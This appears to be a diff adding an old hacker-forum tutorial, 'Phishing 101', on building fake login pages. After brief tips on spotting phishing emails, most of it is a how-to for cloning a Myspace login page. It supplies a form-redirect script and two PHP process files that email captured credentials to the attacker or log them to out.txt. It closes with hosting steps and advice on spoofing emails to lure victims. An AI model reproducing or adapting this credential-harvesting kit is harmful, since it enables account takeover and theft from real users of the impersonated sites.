@@ -1,0 +1,187 @@
+Phishing 101
+IMC Security Team
+Article By IMC Graham Phisher
+Contact gothateimc@yahoo.com
+
+
+1.Intro
+2.What Is Phishing
+3.How To Spot A Phish Attempt
+4.How Phish Pages Are Made and How They Work
+5. Last Tips
+
+1.Intro,
+
+Hey my name is Graham Phisher of the IMC Security team, recently 
+a lot of people have been asking me about phishing. This article 
+is for them because I will explain how it works, why people do 
+it, good tactics that make phishing more effective and more.
+
+2.What Is Phishing,
+
+Phishing is exactly what it sounds like, setting out bait and 
+waiting for someone to bite, but it goes a little bit deeper 
+than that. First off phishing is done on the web, not out at a 
+lake. phishing involves someone setting up whats called a "phisher"
+ or "fake login", which is a login page that records the login a 
+user enters. For example, someone makes a page that looks exactly
+like a "Myspace" login, a user somehow arrives at that page and 
+enters his login, than his login is forwarded to file that records
+ his login, than the person who set up the fake login goes to the 
+file that the login was forwarded to and is now able to login to 
+that users "Myspace". Now this can work with any site on the web 
+that has a login page, facebook, paypal, hotmail, and most likely
+the site your on now. Phishing is not as effective as 
+cracking/hacking, as when you hacking/cracking you break into a
+ system/file whatever, as for phishing you waiting for someone 
+to be a "dumbass" and login in to your page. Heres a example of 
+a fake login.
+
+3.How To Spot A Phish Attempt,
+
+Ussually most phish attacks start with a email or a really pretty 
+girls myspace. The most common scenario has to be when someone 
+receives a email from a company your registered to (Lets just say
+Paypal), heres a example.
+
+QUOTE
+From: Admin (admin@paypal.com)
+To: EricHarris (doom@aol.com)
+
+Hey "Eric" we updated many seucirty features on Paypal, login in 
+to your account to read more about this
+
+Click Here To Login To Paypal
+
+
+Now it might be different in some emails, but in most they are 
+like that, not the wording, but with the link at the end of the 
+email, where they given the option to login, but than they click
+the link, and are brought to what they suspect to be the "Paypal"
+login page so than they enter their info. Now the victim has been 
+phished. How could of "Eric" avoided this. First off the most 
+obvious thing to look out for is the Address on the login page. 
+Second he could of responded to the email to verify that it was 
+actually sent by the actual sender and was not a spoofed email. 
+There are more but those are the best two effective ways.
+
+Another phish attempt that you should be aware of is ussually on 
+social networking websites, such as myspace or facebook, where 
+people set up fake profiles, and than when you click on a link 
+that leads you to a login page. Ussually heres the most common 
+scenario for these type of sites, you login, new messages or new
+ 
+friend requests, you go into the message or friend request than 
+when you click on their profile or open their message you will 
+be redirected to a login page, ussually most users will think 
+its a error, so they think "thats odd im already logged in, 
+whatever" and than they enter their login. How could have this 
+avoided this, dont open messages or go onto profiles that you 
+dont know, and remember to check the address of the site.
+
+4.How Phish Pages Are Made and How They Work,
+
+A fake login is usually made up of 1-3 files that are usually 
+scripted in HTML or PHP. The first file is usually a HTML login 
+page with a small script inside that tells the second file (the 
+process file) to record what they type in. The process file is 
+usually coded in PHP, the process file writes to the third file, 
+which is usually the log file, which is usually in a txt format.
+
+Making a fake login page is easy as hell, first off go to a 
+login page, any page at all that you want to make into a fake 
+login, lets use Myspace for example. Go to "myspace.com" than 
+on your web browser on the menu bar go to "File>>Save Page As" 
+save it in a folder on your desktop called "Fake Login" (please 
+make sure your not logged in when you save the page) than go to 
+the file, and where you see the file you saved rename 
+it, "index.html", than right click it and select the option edit, 
+than add the following code to the bottom.
+
+CODE
+
+<script>
+var x;for(x in
+ document.forms){void(document.forms[x].action="process.php")};
+</script>
+
+
+Now there are two ways to write up the process file. First one is 
+where you get the login emailed (A1) to you, second is where your 
+login gets recorded into a text document (A2).
+
+A1.
+
+Than save. Now we have our login page, the first file of the fake 
+login, now we need our process file. Open notepad, start>run>notepad, 
+and than copy and paste the following code inside.
+
+CODE
+<?php
+$email = "POST DATA\n---------------------------------\n";
+function log($value, $key){ global $email; $email .= $key." =
+ ".$value."\n"; }
+array_walk($_REQUEST, "log");
+mail("email@host.com", "Fake Login", $email);
+header("Location: http://www.page.xxx");
+?>
+
+
+Now we have to do a lil bit of editing, on the code above, on the 
+5th line of code where it says "email@host.com" replace that with 
+your own email for example "gothateimc@yahoo.com". Now on the 6th 
+line of code where it says "http://www.page.xxx" replace that 
+with a address that you want your user to be forwarded to after 
+they login to your login file, for example "http://www.myspace.com". 
+Now save that file as "process.php". END OF A1
+
+A2.
+
+Than save. Now we have our login page, the first file of the fake 
+login, now we need our process file. Open notepad, 
+start>run>notepad, and than copy and paste the following code 
+inside.
+
+CODE
+
+<?php
+header("Location: url");
+$handle = fopen("out.txt", "a");
+foreach($_GET as $variable => $value) {
+  fwrite($handle, $variable);
+  fwrite($handle, "=");
+  fwrite($handle, $value);
+  fwrite($handle, "rn");
+}
+fwrite($handle, "rn");
+fclose($handle);
+exit;
+?>
+
+
+Now for the A2 script we will have to do little editing, on 
+the second line of code where it says "url" change that to where 
+you want the user to go after they enter their login on your 
+login page and now save that file as "process.php". Than create 
+a text document called "out.txt" thats where your logins will be 
+recorded. END OF A2
+
+Now you have your phish page created, to get your phish page 
+on the web you can turn your computer into a file host where 
+someone can access your file and enter their login, but you 
+will need to install php, google if you want do that. Or you 
+can google free web hosts, when looking for a host, make sure 
+you find one that supports "php". Than upload your files, 
+than get people to login, than check your email or log for logins.
+
+5.Last Tips,
+
+Now you may have a phishing page set up, but how are you going 
+to get people to login, having a fake login set up inst enough.
+Some things you might want to google to be more effective with 
+phishing is email spoofing. Email spoofing is the most effective 
+way. Second hang out on forums, and ask around about tips on 
+phishing a certain site. Dont blame me if you get flamed, phishing 
+is some pretty noobish stuff. Anyways thanx for reading.
+
+-Graham Phisher of the IMC Security Team
